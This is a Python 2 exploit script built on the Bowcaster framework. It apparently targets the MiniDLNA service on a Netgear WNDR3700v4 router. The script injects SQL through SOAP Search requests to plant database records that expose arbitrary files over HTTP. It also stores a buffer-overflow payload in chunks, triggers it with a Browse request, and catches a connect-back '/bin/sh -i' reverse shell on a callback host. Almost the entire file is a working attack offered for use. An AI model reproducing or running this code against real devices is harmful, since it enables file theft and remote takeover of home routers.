#!/usr/bin/env python

import math
import sys
import urllib,socket,os,httplib
import time
import environment
from collections import deque
from overflow import WNDR3700v4_Overflow
from xml.dom.minidom import parse,parseString
from bowcaster.clients import HttpClient
from bowcaster.common.support import Logging
from bowcaster.servers.connectback_server import ConnectbackServer

#INJECTION="PWNED"
callback_ip=environment.CALLBACK_IP
target=environment.TARGET


class SoapSqlInjection(object):
    INJECTION_TAG="INJECTION"
    OVERFLOW_TAG="OVERFLOW_ID"
    ID="31337"
    START_TEXT="1=0); "
    INSERT_TEXT="INSERT into ALBUM_ART(ID,PATH) VALUES(\'"
    
    DELETE_DETAILS=START_TEXT+"DELETE from DETAILS where ID = \'%s\'"+";--"
    DELETE_OBJECTS=START_TEXT+"DELETE from OBJECTS where OBJECT_ID = \'%s\'"+";--"
    INSERT_DETAILS=START_TEXT+("INSERT into DETAILS(ID,SIZE,TITLE,ARTIST,TRACK,DLNA_PN,MIME,ALBUM_ART,DISC) "+
                                "VALUES(\'%s\',\'PWNED\',\'PWNED\',\'PWNED\',"+
                                "\'PWNED\',\'%s\',\'PWNED\',\'PWNED\',\'PWNED\');--")
    INSERT_OBJECTS=START_TEXT+("INSERT into OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID) "+
                                "VALUES(\'PWNED\',\'PWNED\',\'container\',\'%s\');--")
                                
    DETAILS_DLNA_PN_APPEND=START_TEXT+("UPDATE DETAILS set DLNA_PN=DLNA_PN||\'%s\' "+
                                        "where ID=\'%s\';--")
    DELETE_TEXT="DELETE from ALBUM_ART WHERE ID = \'"
    SEARCH_SOAP_HEADERS={"Host":"127.0.0.1",
                    "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Search"',
                    "content-type":'text/xml ;charset="utf-8"',
                    "connection":"close"}
    BROWSE_SOAP_HEADERS={"Host":"127.0.0.1",
                    "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                    "content-type":'text/xml ;charset="utf-8"',
                    "connection":"close"}
    INSERT_FINISH_TEXT="\');--"
    DELETE_FINISH_TEXT="\';--"
    
    def __init__(self,host,port="8200",connectback_ip=None,logger=None,action=None,requested_file=None,find=None):
        self.host=host
        self.port=port
        self.requested_file=requested_file
        self.logger=logger
        self.album_art_path="http://%s:%s/AlbumArt/%s-1.jpg" % (self.host,self.port,self.__class__.ID)
        if not self.logger:
            self.logger=Logging()
        if action=="overflow":
            if not connectback_ip:
                raise Exception("Connect-back IP required to create buffer overflow.")
            self.overflow=WNDR3700v4_Overflow(connectback_ip).overflow
            #if we're looking for a value, no need to throw exploit
            if not find:
                self.inject_overflow()
                self.browse_overflow()
        elif action=="insert":
            self.inject_album_art()
        elif action=="delete":
            self.requested_file=None
            self.delete_overflow()
            self.inject_album_art()
    
    def string_chunks(self,somestring,chunk_size):
        
        parts=[]
        queue=deque(somestring)
        part=""
        while len(queue) > 0:
            char=queue.popleft()
            if char in WNDR3700v4_Overflow.SQL_BAD:
                #SQL escape
                char="\'||x\'%02x\'||\'" % ord(char)
            if len(part)+len(char) > chunk_size:
                parts.append(part)
                part=""
            part+=char
        
        if len(part) > 0:
            parts.append(part)
            
        return parts
        
    def build_insert_injection(self):
        cls=self.__class__
        injection=cls.START_TEXT+cls.INSERT_TEXT+cls.ID+"\',\'"+self.requested_file+cls.INSERT_FINISH_TEXT
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
    
    def build_delete_injection(self):
        cls=self.__class__
        injection=cls.START_TEXT+cls.DELETE_TEXT+cls.ID+cls.DELETE_FINISH_TEXT
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
    
    def build_append_injection(self,append_string):
        cls=self.__class__
        injection=cls.DETAILS_DLNA_PN_APPEND % (append_string,cls.ID)
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request

    def build_delete_objects_overflow(self):
        cls=self.__class__
        injection=cls.DELETE_OBJECTS % cls.ID
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
    
    def build_delete_details_overflow(self):
        cls=self.__class__
        injection=cls.DELETE_DETAILS % cls.ID
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
        
    def build_insert_details_overflow(self,overflow_string):
        cls=self.__class__
        injection=cls.INSERT_DETAILS % (cls.ID,overflow_string)
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
        
    def build_insert_objects_overflow(self):
        cls=self.__class__
        injection=cls.INSERT_OBJECTS % cls.ID
        self.logger.LOG_DEBUG(injection)
        request=self.build_soap_request(injection)
        return request
        
    def build_soap_request(self,search_criteria):
        cls=self.__class__
        request=""
        dom=parse("./soaprequest_search.xml")

        for node in dom.getElementsByTagName("SearchCriteria"):
            for node in node.childNodes:
                if node.nodeType==node.TEXT_NODE and node.data == cls.INJECTION_TAG:
                    node.data=search_criteria
                    break
        try:
            request=dom.toxml()
        except UnicodeDecodeError:
            #do it the hacky way if we cant get our overflow data to encode
            request=open("./soaprequest_search.xml","r").read()
            request=request.replace(cls.INJECTION_TAG,search_criteria)
            print request
        return request
    
    def browse_overflow(self):
        self.logger.LOG_DEBUG("Browsing overflow.")
        cls=self.__class__
        client=HttpClient()
        URL="http://%s:%s%s" % (self.host,self.port,"/ctl/ContentDir")
        request=""
        dom=parse("./soaprequest_browse.xml")
        for node in dom.getElementsByTagName("ObjectID"):
            for node in node.childNodes:
                if node.nodeType==node.TEXT_NODE and node.data == cls.OVERFLOW_TAG:
                    node.data="PWNED"
                    break
        request=dom.toxml()

        client.send(URL,post_data=request,headers=cls.BROWSE_SOAP_HEADERS,get_resp=False)
        
    
    def delete_overflow(self):
        cls=self.__class__
        client=HttpClient()
        URL="http://%s:%s%s" % (self.host,self.port,"/ctl/ContentDir")
        
        request=self.build_delete_objects_overflow()
        client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
        
        request=self.build_delete_details_overflow()
        client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
        
    
    def inject_overflow(self):
        cls=self.__class__
        client=HttpClient()
        URL="http://%s:%s%s" % (self.host,self.port,"/ctl/ContentDir")
        overflow_string=str(self.overflow)
        
        self.delete_overflow()
        
        parts=self.string_chunks(overflow_string,256)
        request=self.build_insert_details_overflow(parts[0])
        client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
        
        for part in parts[1:]:
            request=self.build_append_injection(part)
            client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
        request=self.build_insert_objects_overflow()
        client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
    
    
    def inject_album_art(self):
        cls=self.__class__
        client=HttpClient()
        URL="http://%s:%s%s" % (self.host,self.port,"/ctl/ContentDir")
        self.logger.LOG_DEBUG(URL)
        
        request=self.build_delete_injection()
        client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)
        
        if self.requested_file:
            request=self.build_insert_injection()
            client.send(URL,post_data=request,headers=cls.SEARCH_SOAP_HEADERS)


def do_overflow(callback_ip,target):
    Logging().LOG_INFO("doing overflow")
    connectback_server=ConnectbackServer(callback_ip,startcmd="/bin/sh -i")
    pid=connectback_server.serve()
    time.sleep(1)
    if pid:
        try:
            SoapSqlInjection(target,connectback_ip=callback_ip,action="overflow")
            connectback_server.wait()
        except Exception as e:
            print e
            Logging().LOG_WARN("Failed to connect. Killing connect-back server.")
            connectback_server.shutdown()
            raise e
    else:
        Logging().LOG_WARN("Failed to start connect-back server.")

    
    

try:
    action=sys.argv[1]
    if("insert" == action):
        filename=sys.argv[2]
        Logging().log_msg("Inserting record for %s" % filename)
        injected=SoapSqlInjection(target,action="insert",requested_file=filename,)
        Logging().LOG_INFO("You can retrieve %s via the url\n\t%s" % (filename,injected.album_art_path))

    elif("delete" == action):
        Logging().log_msg("Purging old record.")
        SoapSqlInjection(target,action="delete")
    elif("overflow" == action):
        do_overflow(callback_ip,target)
    elif action.startswith("find="):
        find=action.split('=')[1]
        value=find
        if find.startswith("0x"):
            value=int(find,16)
        exploit=SoapSqlInjection(target,connectback_ip=callback_ip,action="overflow",find=value)
        Logging().LOG_INFO("%s offset: %d"%(find,exploit.overflow.find_offset(value)))
    else:
        print "Specify either \"delete\" or \"insert <requested filename>\""
        exit(1)
        
except IndexError:
    print "Specify either \"delete\" or \"insert <requested filename>\""
    exit(1)
except Exception as e:
    Logging().LOG_WARN("Exploit failed.")
    print e
    raise e
    exit(1)


    


